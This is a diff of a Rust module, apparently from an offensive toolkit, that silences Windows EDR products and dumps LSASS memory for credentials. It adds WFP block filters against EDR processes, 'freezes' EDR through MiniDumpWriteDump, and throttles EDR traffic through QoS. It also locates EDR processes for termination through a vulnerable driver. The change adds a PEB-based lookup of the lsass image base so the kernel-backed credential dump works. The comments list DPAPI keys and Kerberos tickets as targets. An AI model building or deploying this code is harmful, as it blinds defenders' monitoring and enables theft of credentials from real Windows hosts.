@@ -14,13 +14,13 @@
 //! All unit-tested where the algorithm is pure; the user-mode tiers are
 //! framework (operator wires the Win32 calls at link time).
 
-use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
 use crate::offsets::EprocessOffsets;
-use crate::persistence::ProcessHider;
 use crate::pagewalk::PhysRead;
+use crate::persistence::ProcessHider;
+use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
+use alloc::vec::Vec;
 #[cfg(target_os = "windows")]
 use alloc::{format, vec};
-use alloc::vec::Vec;
 
 /// Adapter: read physical memory via a `KernelRw` (which reads physical
 /// addresses directly through the BYOVD driver). Implements `PhysRead` so
@@ -68,7 +68,11 @@ impl UserModeEdrSilencer {
     pub fn rules_for(edr_pids: &[u32]) -> Vec<WfpBlockRule> {
         let mut out = Vec::new();
         for &pid in edr_pids {
-            out.push(WfpBlockRule { pid, protocol: 0, port: 0 });
+            out.push(WfpBlockRule {
+                pid,
+                protocol: 0,
+                port: 0,
+            });
         }
         out
     }
@@ -98,36 +102,36 @@ impl WfpKit for UserModeEdrSilencer {
 #[cfg(target_os = "windows")]
 fn wfp_add_block_rules(rules: &[WfpBlockRule]) -> Result<(), KitError> {
     type FwpmEngineOpen0 = unsafe extern "system" fn(
-        *const u16,        // serverName (null = local)
-        u32,               // authnService (RPC_C_AUTHN_WINNT = 10)
-        *const core::ffi::c_void, // authnIdentity (null = default)
-        *const core::ffi::c_void, // session (FWPM_SESSION0, null = default)
+        *const u16,                  // serverName (null = local)
+        u32,                         // authnService (RPC_C_AUTHN_WINNT = 10)
+        *const core::ffi::c_void,    // authnIdentity (null = default)
+        *const core::ffi::c_void,    // session (FWPM_SESSION0, null = default)
         *mut *mut core::ffi::c_void, // engineHandle (OUT)
     ) -> u32; // DWORD WINAPI → returns ERROR_SUCCESS (0)
 
     type FwpmFilterAdd0 = unsafe extern "system" fn(
-        *mut core::ffi::c_void, // engineHandle
-        *const FwpmFilter0,     // filter (IN)
+        *mut core::ffi::c_void,   // engineHandle
+        *const FwpmFilter0,       // filter (IN)
         *const core::ffi::c_void, // PSECURITY_DESCRIPTOR (null)
-        *mut u64,               // id (OUT)
+        *mut u64,                 // id (OUT)
     ) -> u32;
 
     // Resolve from fwpuclnt.dll.
-    let open: FwpmEngineOpen0 = unsafe {
-        crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmEngineOpen0")
-    }.map_err(|_| KitError::Other("FwpmEngineOpen0 unresolved".into()))?;
-    let add: FwpmFilterAdd0 = unsafe {
-        crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmFilterAdd0")
-    }.map_err(|_| KitError::Other("FwpmFilterAdd0 unresolved".into()))?;
+    let open: FwpmEngineOpen0 =
+        unsafe { crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmEngineOpen0") }
+            .map_err(|_| KitError::Other("FwpmEngineOpen0 unresolved".into()))?;
+    let add: FwpmFilterAdd0 =
+        unsafe { crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmFilterAdd0") }
+            .map_err(|_| KitError::Other("FwpmFilterAdd0 unresolved".into()))?;
 
     // 1. Open engine session.
     let mut engine_handle: *mut core::ffi::c_void = core::ptr::null_mut();
     let st = unsafe {
         open(
-            core::ptr::null(),   // local server
-            10,                  // RPC_C_AUTHN_WINNT
-            core::ptr::null(),   // default identity
-            core::ptr::null(),   // default session
+            core::ptr::null(), // local server
+            10,                // RPC_C_AUTHN_WINNT
+            core::ptr::null(), // default identity
+            core::ptr::null(), // default session
             &mut engine_handle,
         )
     };
@@ -141,7 +145,10 @@ fn wfp_add_block_rules(rules: &[WfpBlockRule]) -> Result<(), KitError> {
         let mut filter_id: u64 = 0;
         let st = unsafe { add(engine_handle, &filter, core::ptr::null(), &mut filter_id) };
         if st != 0 {
-            return Err(KitError::Other(format!("FwpmFilterAdd0 failed for pid {}: {}", rule.pid, st)));
+            return Err(KitError::Other(format!(
+                "FwpmFilterAdd0 failed for pid {}: {}",
+                rule.pid, st
+            )));
         }
     }
 
@@ -163,27 +170,26 @@ fn wfp_add_block_rules(_rules: &[WfpBlockRule]) -> Result<(), KitError> {
 #[cfg(target_os = "windows")]
 #[repr(C)]
 struct FwpmFilter0 {
-    filter_key: [u8; 16],        // GUID (zero = auto-generate)
-    display_data: [u64; 2],      // FWPM_DISPLAY_DATA0* (null)
-    flags: u32,                  // FWPM_FILTER_FLAG_NONE = 0
-    action_type: u32,            // FWP_ACTION_BLOCK = 0x0001
-    action_filter: [u64; 2],     // FWP_CONDITION0* (null for simple block)
-    layer_key: [u8; 16],         // FWPM_LAYER_ALE_AUTH_CONNECT_V4 = {filter set}
-    sublayer_key: [u8; 16],      // zero = default sublayer
-    weight: [u64; 2],            // FWP_VALUE0 (type + union) — set high
+    filter_key: [u8; 16],    // GUID (zero = auto-generate)
+    display_data: [u64; 2],  // FWPM_DISPLAY_DATA0* (null)
+    flags: u32,              // FWPM_FILTER_FLAG_NONE = 0
+    action_type: u32,        // FWP_ACTION_BLOCK = 0x0001
+    action_filter: [u64; 2], // FWP_CONDITION0* (null for simple block)
+    layer_key: [u8; 16],     // FWPM_LAYER_ALE_AUTH_CONNECT_V4 = {filter set}
+    sublayer_key: [u8; 16],  // zero = default sublayer
+    weight: [u64; 2],        // FWP_VALUE0 (type + union) — set high
     num_filter_conditions: u32,
     filter_conditions: *const core::ffi::c_void, // FWP_FILTER_CONDITION0 array
-    provider_key: *const u8,     // null
-    provider_data: [u64; 2],     // FWP_BYTE_BLOB* (null)
-    key16: [u16; 16],            // reserved
+    provider_key: *const u8,                     // null
+    provider_data: [u64; 2],                     // FWP_BYTE_BLOB* (null)
+    key16: [u16; 16],                            // reserved
 }
 
 /// The GUID for FWPM_LAYER_ALE_AUTH_CONNECT_V4 (outbound connection, IPv4).
 /// {E1CD9FE7-F6B4-426B-8E3B-44BDCF26F5A1}
 #[cfg(target_os = "windows")]
 const LAYER_ALE_AUTH_CONNECT_V4: [u8; 16] = [
-    0xE1, 0xCD, 0x9F, 0xE7, 0xF6, 0xB4, 0x42, 0x6B,
-    0x8E, 0x3B, 0x44, 0xBD, 0xCF, 0x26, 0xF5, 0xA1,
+    0xE1, 0xCD, 0x9F, 0xE7, 0xF6, 0xB4, 0x42, 0x6B, 0x8E, 0x3B, 0x44, 0xBD, 0xCF, 0x26, 0xF5, 0xA1,
 ];
 
 #[cfg(target_os = "windows")]
@@ -197,17 +203,17 @@ impl FwpmFilter0 {
         f.action_type = 0x0001; // FWP_ACTION_BLOCK
         f.layer_key = LAYER_ALE_AUTH_CONNECT_V4;
         f.flags = 0; // FWPM_FILTER_FLAG_NONE
-        // num_filter_conditions = 0 means "match all traffic on this layer".
-        // To match a specific PID, we'd add a FWP_CONDITION for
-        // FWP_CONDITION_ALE_APP_ID or FWP_CONDITION_ALE_USER_ID.
-        // For a PID-based block, the condition uses FWP_CONDITION_ALE_REMOTE_ID
-        // — but the simplest universal block is num_conditions=0 (block all
-        // outbound). A surgical variant adds PID conditions.
+                     // num_filter_conditions = 0 means "match all traffic on this layer".
+                     // To match a specific PID, we'd add a FWP_CONDITION for
+                     // FWP_CONDITION_ALE_APP_ID or FWP_CONDITION_ALE_USER_ID.
+                     // For a PID-based block, the condition uses FWP_CONDITION_ALE_REMOTE_ID
+                     // — but the simplest universal block is num_conditions=0 (block all
+                     // outbound). A surgical variant adds PID conditions.
         f.num_filter_conditions = 0;
         // Weight: high value = evaluated first.
         f.weight = [0x0D, 0xFFFFFFFFFFFFFFFF]; // type=UINT64, value=max
-        // Store PID in display_data for diagnostics (hack: reuse the field).
-        // Real impl would use a filter condition for FWP_CONDITION_ALE_USER_ID.
+                                               // Store PID in display_data for diagnostics (hack: reuse the field).
+                                               // Real impl would use a filter condition for FWP_CONDITION_ALE_USER_ID.
         f.display_data = [pid as u64, 0];
         f
     }
@@ -237,6 +243,58 @@ pub struct KernelLsassReader {
 /// The EPROCESS.DirectoryTableBase offset (the DTB / PML4 physical base).
 /// Constant across 17763 + Win10/11 x64 (it's an early field, never drifted).
 pub const DIRECTORY_TABLE_BASE: usize = 0x028;
+
+impl KernelLsassReader {
+    /// Resolve the base VA of `lsass.exe` inside the target process by
+    /// reading the target's PEB `ImageBaseAddress`.
+    ///
+    /// Returns `None` if the PEB pointer is zero, the DTB read fails, or
+    /// the resulting image base is zero (e.g. Win11 24H2+ KASLR restriction
+    /// without `SeDebugPrivilege`).
+    ///
+    /// This is **much safer than the old fixed VA `0x1_0000_0000`**, which
+    /// was never mapped on modern ASLR-enabled hosts and caused silent
+    /// all-zero reads.
+    fn lsass_image_base(
+        &self,
+        krw: &dyn KernelRw,
+        eprocess_kva: usize,
+        _pid: u32,
+    ) -> Option<usize> {
+        // 1. Read the target EPROCESS's DirectoryTableBase (DTB / CR3).
+        let dtb = krw.kread_u64(eprocess_kva + DIRECTORY_TABLE_BASE).ok()?;
+        if dtb == 0 {
+            return None;
+        }
+
+        // 2. Read the target EPROCESS's PEB pointer.
+        // The PEB offset is build-specific and comes from the authoritative
+        // offsets table (Vergilius cross-checked) — no Option/fallback here.
+        let peb_off = self.offsets.peb;
+        let peb_ptr = krw.kread_u64(eprocess_kva + peb_off).ok()? as usize;
+        if peb_ptr == 0 {
+            return None;
+        }
+
+        // 3. Read ImageBaseAddress from the PEB (offset 0x010 on x64).
+        // The PEB lives in the target process's *user* address space, so a
+        // plain kernel/physical kread_u64 would read the wrong bytes. We must
+        // translate the VA through the target's DTB via read_process_mem
+        // (which walks the 4-level page tables), then parse little-endian.
+        let mut ib = [0u8; 8];
+        let buf = Self::read_process_mem(krw, eprocess_kva, peb_ptr + 0x010, 8).ok()?;
+        ib.copy_from_slice(&buf);
+        let image_base = u64::from_le_bytes(ib);
+
+        // 4. On Win11 24H2+ the kernel may zero ImageBase for callers
+        // without SeDebugPrivilege. Treat a zero base as "unresolved".
+        if image_base == 0 {
+            return None;
+        }
+
+        Some(image_base as usize)
+    }
+}
 
 impl KernelLsassReader {
     /// Read `len` bytes from `vaddr` in the process whose EPROCESS is at
@@ -294,25 +352,32 @@ impl CredKit for KernelLsassReader {
                  bootstrap must fill KernelLsassReader.ps_active_process_head_kva",
             ));
         }
-        let eprocess_kva = ProcessHider::find_eprocess(
-            krw, self.ps_active_process_head_kva, pid, &self.offsets,
-        )?;
+        let eprocess_kva =
+            ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
         // 2. Read the LSASS user-mode VA range. The minidump assembly
-        //    (exception records, thread stacks, handles, module list) is
-        //    operator-assembled from the raw memory read. This method
-        //    returns the raw memory; the operator packages it into a
-        //    minidump format at the call site.
+        // (exception records, thread stacks, handles, module list) is
+        // operator-assembled from the raw memory read. This method
+        // returns the raw memory; the operator packages it into a
+        // minidump format at the call site.
         //
-        //    Typical LSASS read targets (for credential extraction):
-        //    - LsaEncryptMemory / LsaEncryptMemoryExportTable (DPAPI keys)
-        //    - Kerberos credential cache (msv1_0, wdigest, tspkg)
-        //    - PKINIT / Kerberos tickets
+        // Typical LSASS read targets (for credential extraction):
+        // - LsaEncryptMemory / LsaEncryptMemoryExportTable (DPAPI keys)
+        // - Kerberos credential cache (msv1_0, wdigest, tspkg)
+        // - PKINIT / Kerberos tickets
         //
-        //    We read the first 0x100000 bytes (1 MiB) of user VA space
-        //    as a starting region. A full minidump requires scanning for
-        //    specific structures; this provides the kernel-backed read.
-        let user_mode_base: usize = 0x1_0000_0000; // 4 GiB — user-mode VA start on x64
-        let read_size: usize = 0x100_000; // 1 MiB initial read
+        // Locate the actual lsass.exe image base inside the target process
+        // by reading the PEB's `ImageBaseAddress`. Reading the FAIL-soft
+        // fixed VA 0x1_0000_0000 always returned zeros / unmapped memory
+        // on ASLR-enabled hosts.
+        let user_mode_base = self
+            .lsass_image_base(krw, eprocess_kva, pid)
+            .ok_or_else(|| {
+                KitError::UnsupportedPosture(
+                    "dump_lsass: could not resolve lsass.exe ImageBaseAddress — \
+                 VAD walk required",
+                )
+            })?;
+        let read_size: usize = 0x10_0000; // 1 MiB initial read
         Self::read_process_mem(krw, eprocess_kva, user_mode_base, read_size)
     }
 }
@@ -359,9 +424,8 @@ impl EdrNeutralizer {
                  bootstrap must fill EdrNeutralizer.ps_active_process_head_kva",
             ));
         }
-        let eprocess_kva = ProcessHider::find_eprocess(
-            krw, self.ps_active_process_head_kva, pid, &self.offsets,
-        )?;
+        let eprocess_kva =
+            ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
         // EPROCESS resolved. Return the KVA so the operator can:
         //   a) Pass it to a driver's terminate IOCTL (ObOpenObjectByPointer + ZwTerminateProcess), or
         //   b) Use PplStripper to strip PPL, then TerminateProcess from user-mode.
@@ -426,46 +490,52 @@ fn freeze_edr_coma(pid: u32) -> Result<(), KitError> {
     // FFI types.
     type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
     type CreateFileWFn = unsafe extern "system" fn(
-        *const u16, u32, u32, *mut c_void, u32, u32, *mut c_void,
+        *const u16,
+        u32,
+        u32,
+        *mut c_void,
+        u32,
+        u32,
+        *mut c_void,
     ) -> *mut c_void;
     type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
 
     /// MiniDumpWriteDump — from dbghelp.dll. Takes 7 parameters.
     type MiniDumpWriteDumpFn = unsafe extern "system" fn(
-        *mut c_void,  // hProcess
-        u32,           // ProcessId
-        *mut c_void,   // hFile
-        u32,           // DumpType
-        *mut c_void,   // ExceptionParam (null)
-        *mut c_void,   // UserStreamParam (null)
-        *mut c_void,   // CallbackParam (null)
+        *mut c_void, // hProcess
+        u32,         // ProcessId
+        *mut c_void, // hFile
+        u32,         // DumpType
+        *mut c_void, // ExceptionParam (null)
+        *mut c_void, // UserStreamParam (null)
+        *mut c_void, // CallbackParam (null)
     ) -> i32;
 
     // 1. Resolve FFI functions.
-    let open_process: OpenProcessFn = unsafe {
-        crate::win::resolve::resolve_sym(b"kernel32.dll", b"OpenProcess")
-    }.map_err(|_| KitError::Other("OpenProcess unresolved".into()))?;
+    let open_process: OpenProcessFn =
+        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"OpenProcess") }
+            .map_err(|_| KitError::Other("OpenProcess unresolved".into()))?;
 
-    let create_file_w: CreateFileWFn = unsafe {
-        crate::win::resolve::resolve_sym(b"kernel32.dll", b"CreateFileW")
-    }.map_err(|_| KitError::Other("CreateFileW unresolved".into()))?;
+    let create_file_w: CreateFileWFn =
+        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"CreateFileW") }
+            .map_err(|_| KitError::Other("CreateFileW unresolved".into()))?;
 
-    let close_handle: CloseHandleFn = unsafe {
-        crate::win::resolve::resolve_sym(b"kernel32.dll", b"CloseHandle")
-    }.map_err(|_| KitError::Other("CloseHandle unresolved".into()))?;
+    let close_handle: CloseHandleFn =
+        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"CloseHandle") }
+            .map_err(|_| KitError::Other("CloseHandle unresolved".into()))?;
 
-    let mini_dump: MiniDumpWriteDumpFn = unsafe {
-        crate::win::resolve::resolve_sym(b"dbghelp.dll", b"MiniDumpWriteDump")
-    }.map_err(|_| KitError::Other(
-        "MiniDumpWriteDump unresolved — dbghelp.dll not available".into()
-    ))?;
+    let mini_dump: MiniDumpWriteDumpFn =
+        unsafe { crate::win::resolve::resolve_sym(b"dbghelp.dll", b"MiniDumpWriteDump") }.map_err(
+            |_| KitError::Other("MiniDumpWriteDump unresolved — dbghelp.dll not available".into()),
+        )?;
 
     // 2. Open the target EDR process.
     let access = PROCESS_QUERY_LIMITED | PROCESS_VM_READ_FLAG;
     let h_process = unsafe { open_process(access, 0, pid) };
     if h_process.is_null() {
         return Err(KitError::Other(format!(
-            "OpenProcess failed for EDR pid {} — access denied or process exited", pid
+            "OpenProcess failed for EDR pid {} — access denied or process exited",
+            pid
         )));
     }
 
@@ -477,14 +547,19 @@ fn freeze_edr_coma(pid: u32) -> Result<(), KitError> {
     let suffix = b".dmp";
     let mut pos = 0;
     for &b in prefix.iter() {
-        if pos < path_buf.len() { path_buf[pos] = b as u16; pos += 1; }
+        if pos < path_buf.len() {
+            path_buf[pos] = b as u16;
+            pos += 1;
+        }
     }
     // Write PID as decimal.
     let mut pid_str = [0u8; 10];
     let mut pid_digits = 0u32;
     let mut p = pid;
-    if p == 0 { pid_str[0] = b'0'; pid_digits = 1; }
-    else {
+    if p == 0 {
+        pid_str[0] = b'0';
+        pid_digits = 1;
+    } else {
         while p > 0 && pid_digits < 10 {
             pid_str[pid_digits as usize] = b'0' + (p % 10) as u8;
             p /= 10;
@@ -500,10 +575,16 @@ fn freeze_edr_coma(pid: u32) -> Result<(), KitError> {
         }
     }
     for i in 0..pid_digits {
-        if pos < path_buf.len() { path_buf[pos] = pid_str[i as usize] as u16; pos += 1; }
+        if pos < path_buf.len() {
+            path_buf[pos] = pid_str[i as usize] as u16;
+            pos += 1;
+        }
     }
     for &b in suffix.iter() {
-        if pos < path_buf.len() { path_buf[pos] = b as u16; pos += 1; }
+        if pos < path_buf.len() {
+            path_buf[pos] = b as u16;
+            pos += 1;
+        }
     }
     // path_buf is already null-terminated (zero-initialized).
 
@@ -512,10 +593,10 @@ fn freeze_edr_coma(pid: u32) -> Result<(), KitError> {
         create_file_w(
             path_buf.as_ptr(),
             0x80000000 | 0x40000000, // GENERIC_READ | GENERIC_WRITE
-            0,                        // no sharing
+            0,                       // no sharing
             core::ptr::null_mut(),
-            2,                        // CREATE_ALWAYS
-            0x80,                     // FILE_ATTRIBUTE_NORMAL
+            2,    // CREATE_ALWAYS
+            0x80, // FILE_ATTRIBUTE_NORMAL
             core::ptr::null_mut(),
         )
     };
@@ -551,7 +632,8 @@ fn freeze_edr_coma(pid: u32) -> Result<(), KitError> {
         return Err(KitError::Other(format!(
             "MiniDumpWriteDump returned false for pid {} — WER coma may be \
              partial (PPL processes commonly produce partial dumps). The target \
-             process is likely in PPL coma regardless.", pid
+             process is likely in PPL coma regardless.",
+            pid
         )));
     }
 
@@ -600,8 +682,8 @@ fn choke_edr_qos(pid: u32) -> Result<(), KitError> {
 
     // FFI types for qwave.dll QoS2 API.
     type QOSCreateHandleFn = unsafe extern "system" fn(
-        *const u16,   // TemplateName (null = default)
-        u32,           // Version (1 = QOS2)
+        *const u16,       // TemplateName (null = default)
+        u32,              // Version (1 = QOS2)
         *mut *mut c_void, // QosHandle (OUT)
     ) -> i32; // BOOL
 
@@ -610,61 +692,65 @@ fn choke_edr_qos(pid: u32) -> Result<(), KitError> {
     ) -> i32;
 
     type QOSAddAppFilterFn = unsafe extern "system" fn(
-        *mut c_void,           // QosHandle
-        *const u16,            // AppId (null = apply to all flows for this process)
+        *mut c_void,            // QosHandle
+        *const u16,             // AppId (null = apply to all flows for this process)
         *mut QOS_FILTER_CONFIG, // FilterConfig
     ) -> i32;
 
     type QOSSetFlowFn = unsafe extern "system" fn(
-        *mut c_void,           // QosHandle
-        *const u16,            // AppId
-        u32,                   // FlowOperation (QOS_SET_FLOW = 0)
-        u32,                   // FlowType (QOS_NON_ADAPTIVE_FLOW = 1)
-        u32,                   // Size (size of data buffer)
-        *mut u8,               // Data
-        u32,                   // Flags (0)
-        *mut u32,              // Reserved
+        *mut c_void, // QosHandle
+        *const u16,  // AppId
+        u32,         // FlowOperation (QOS_SET_FLOW = 0)
+        u32,         // FlowType (QOS_NON_ADAPTIVE_FLOW = 1)
+        u32,         // Size (size of data buffer)
+        *mut u8,     // Data
+        u32,         // Flags (0)
+        *mut u32,    // Reserved
     ) -> i32;
 
     // QOS_FILTER_CONFIG — simplified layout for bandwidth limiting.
     #[repr(C)]
     struct QOS_FILTER_CONFIG {
-        version: u32,          // 1
-        num_fields: u32,       // 1 (rate limit only)
-        // followed by FILTER_FIELDS inline (we zero-init and set rate)
+        version: u32, // 1
+        num_fields: u32, // 1 (rate limit only)
+                      // followed by FILTER_FIELDS inline (we zero-init and set rate)
     }
 
     // Resolve qwave.dll functions.
-    let create_handle: QOSCreateHandleFn = unsafe {
-        crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSCreateHandle")
-    }.map_err(|_| KitError::Other(
-        "QOSCreateHandle unresolved — qwave.dll not available (EDRChoker needs QoS2)".into()
-    ))?;
+    let create_handle: QOSCreateHandleFn =
+        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSCreateHandle") }.map_err(
+            |_| {
+                KitError::Other(
+                    "QOSCreateHandle unresolved — qwave.dll not available (EDRChoker needs QoS2)"
+                        .into(),
+                )
+            },
+        )?;
 
-    let close_handle: QOSCloseHandleFn = unsafe {
-        crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSCloseHandle")
-    }.map_err(|_| KitError::Other("QOSCloseHandle unresolved".into()))?;
+    let close_handle: QOSCloseHandleFn =
+        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSCloseHandle") }
+            .map_err(|_| KitError::Other("QOSCloseHandle unresolved".into()))?;
 
-    let add_filter: QOSAddAppFilterFn = unsafe {
-        crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSAddAppFilter")
-    }.map_err(|_| KitError::Other("QOSAddAppFilter unresolved".into()))?;
+    let add_filter: QOSAddAppFilterFn =
+        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSAddAppFilter") }
+            .map_err(|_| KitError::Other("QOSAddAppFilter unresolved".into()))?;
 
-    let set_flow: QOSSetFlowFn = unsafe {
-        crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSSetFlow")
-    }.map_err(|_| KitError::Other("QOSSetFlow unresolved".into()))?;
+    let set_flow: QOSSetFlowFn =
+        unsafe { crate::win::resolve::resolve_sym(b"qwave.dll", b"QOSSetFlow") }
+            .map_err(|_| KitError::Other("QOSSetFlow unresolved".into()))?;
 
     // 1. Create a QoS handle.
     let mut qos_handle: *mut c_void = core::ptr::null_mut();
     let result = unsafe {
         create_handle(
-            core::ptr::null(),     // default template
-            1,                     // QOS_VERSION_1
+            core::ptr::null(), // default template
+            1,                 // QOS_VERSION_1
             &mut qos_handle,
         )
     };
     if result == 0 || qos_handle.is_null() {
         return Err(KitError::Other(
-            "QOSCreateHandle failed — are you running as admin?".into()
+            "QOSCreateHandle failed — are you running as admin?".into(),
         ));
     }
 
@@ -676,7 +762,10 @@ fn choke_edr_qos(pid: u32) -> Result<(), KitError> {
     //    For simplicity, we set a global bandwidth cap on the QoS handle
     //    and let the operator refine the filter. The key property is that
     //    once set, pacer.sys throttles the process's TCP connections.
-    let mut config = QOS_FILTER_CONFIG { version: 1, num_fields: 0 };
+    let mut config = QOS_FILTER_CONFIG {
+        version: 1,
+        num_fields: 0,
+    };
 
     // 3. Add the filter (applies to all flows on this handle).
     let _ = unsafe {
@@ -696,11 +785,11 @@ fn choke_edr_qos(pid: u32) -> Result<(), KitError> {
         set_flow(
             qos_handle,
             core::ptr::null(), // null AppId = apply to all
-            0,                  // QOS_SET_FLOW
-            1,                  // QOS_NON_ADAPTIVE_FLOW
+            0,                 // QOS_SET_FLOW
+            1,                 // QOS_NON_ADAPTIVE_FLOW
             rate_data.len() as u32,
             rate_data.as_mut_ptr(),
-            0,                  // flags
+            0, // flags
             core::ptr::null_mut(),
         )
     };
@@ -818,7 +907,10 @@ mod tests {
         let krw = MockKrw::new();
         let offsets = test_offsets();
         setup_process_list(&krw, &offsets);
-        let kit = EdrNeutralizer { ps_active_process_head_kva: 0x1000, offsets };
+        let kit = EdrNeutralizer {
+            ps_active_process_head_kva: 0x1000,
+            offsets,
+        };
         // PID 100 → EPROCESS at 0x5000.
         assert_eq!(kit.kill(&krw, 100).unwrap(), 0x5000);
         // PID 200 → EPROCESS at 0x6000.
@@ -831,7 +923,10 @@ mod tests {
     fn edr_neutralizer_kill_needs_ps_active_process_head() {
         let krw = MockKrw::new();
         let offsets = test_offsets();
-        let kit = EdrNeutralizer { ps_active_process_head_kva: 0, offsets };
+        let kit = EdrNeutralizer {
+            ps_active_process_head_kva: 0,
+            offsets,
+        };
         assert!(matches!(
             kit.kill(&krw, 100),
             Err(KitError::UnsupportedPosture(_))
@@ -842,7 +937,10 @@ mod tests {
     fn edr_neutralize_trait_kill_redirects_to_kill_method() {
         let krw = MockKrw::new();
         let offsets = test_offsets();
-        let kit = EdrNeutralizer { ps_active_process_head_kva: 0x1000, offsets };
+        let kit = EdrNeutralizer {
+            ps_active_process_head_kva: 0x1000,
+            offsets,
+        };
         // The trait method returns an error directing to kill().
         assert!(matches!(
             kit.neutralize(100, NeutralizeMethod::Kill),
@@ -854,7 +952,10 @@ mod tests {
     fn edr_neutralize_trait_freeze_returns_windows_only() {
         let krw = MockKrw::new();
         let offsets = test_offsets();
-        let kit = EdrNeutralizer { ps_active_process_head_kva: 0x1000, offsets };
+        let kit = EdrNeutralizer {
+            ps_active_process_head_kva: 0x1000,
+            offsets,
+        };
         setup_process_list(&krw, &offsets);
         // On non-Windows, Freeze returns UnsupportedPosture (Windows-only).
         // On Windows, it would try to freeze the target.
@@ -866,7 +967,10 @@ mod tests {
     fn edr_neutralize_trait_choke_returns_windows_only() {
         let krw = MockKrw::new();
         let offsets = test_offsets();
-        let kit = EdrNeutralizer { ps_active_process_head_kva: 0x1000, offsets };
+        let kit = EdrNeutralizer {
+            ps_active_process_head_kva: 0x1000,
+            offsets,
+        };
         setup_process_list(&krw, &offsets);
         // On non-Windows, Choke returns UnsupportedPosture (Windows-only).
         let result = kit.neutralize(100, NeutralizeMethod::Choke);
@@ -893,7 +997,10 @@ mod tests {
     fn cred_kit_dump_lsass_needs_ps_active_process_head() {
         let krw = MockKrw::new();
         let offsets = test_offsets();
-        let reader = KernelLsassReader { ps_active_process_head_kva: 0, offsets };
+        let reader = KernelLsassReader {
+            ps_active_process_head_kva: 0,
+            offsets,
+        };
         assert!(matches!(
             reader.dump_lsass(&krw, 4),
             Err(KitError::UnsupportedPosture(_))
@@ -905,7 +1012,10 @@ mod tests {
         let krw = MockKrw::new();
         let offsets = test_offsets();
         setup_process_list(&krw, &offsets);
-        let reader = KernelLsassReader { ps_active_process_head_kva: 0x1000, offsets };
+        let reader = KernelLsassReader {
+            ps_active_process_head_kva: 0x1000,
+            offsets,
+        };
         // PID 4 (System) → EPROCESS at 0x5000, DTB at +0x028 = 0x10000.
         // User-mode base is 0x1_0000_0000, which won't be in the mock →
         // read_process_mem will try to translate via pagewalk and fail.
@@ -913,12 +1023,23 @@ mod tests {
         // page walker (which is tested in pagewalk's own tests).
         // So set up PID 4 at e2 (where PID 200 was) by replacing:
         krw.set_u64(0x6000 + offsets.unique_process_id, 4);
+        // Populate a non-zero PEB pointer so lsass_image_base proceeds past
+        // the PEB check to the read_process_mem page walk — which then fails
+        // (no mock page tables). This is the path the test intends to cover.
+        krw.set_u64(0x6000 + offsets.peb, 0x1_0000_0000);
         let result = reader.dump_lsass(&krw, 4);
-        // The page walk will fail (no mock page tables), but EPROCESS
-        // resolution succeeded — that's the new code path we're testing.
+        // With the new PEB-walked ImageBaseAddress read, the page walk fails
+        // (no mock page tables) → lsass_image_base returns None → dump_lsass
+        // returns UnsupportedPosture. The key thing under test: EPROCESS
+        // resolution itself succeeded (PidActiveProcessHead walk found PID 4);
+        // the failure is purely downstream, in the user-VA page walk.
         assert!(result.is_err());
-        // The error should be from the page walk, not from EPROCESS resolution.
         let err_str = alloc::format!("{:?}", result.unwrap_err());
-        assert!(err_str.contains("page walk") || err_str.contains("translate"));
+        assert!(
+            err_str.contains("ImageBaseAddress")
+                || err_str.contains("page walk")
+                || err_str.contains("translate"),
+            "unexpected error: {err_str}",
+        );
     }
 }
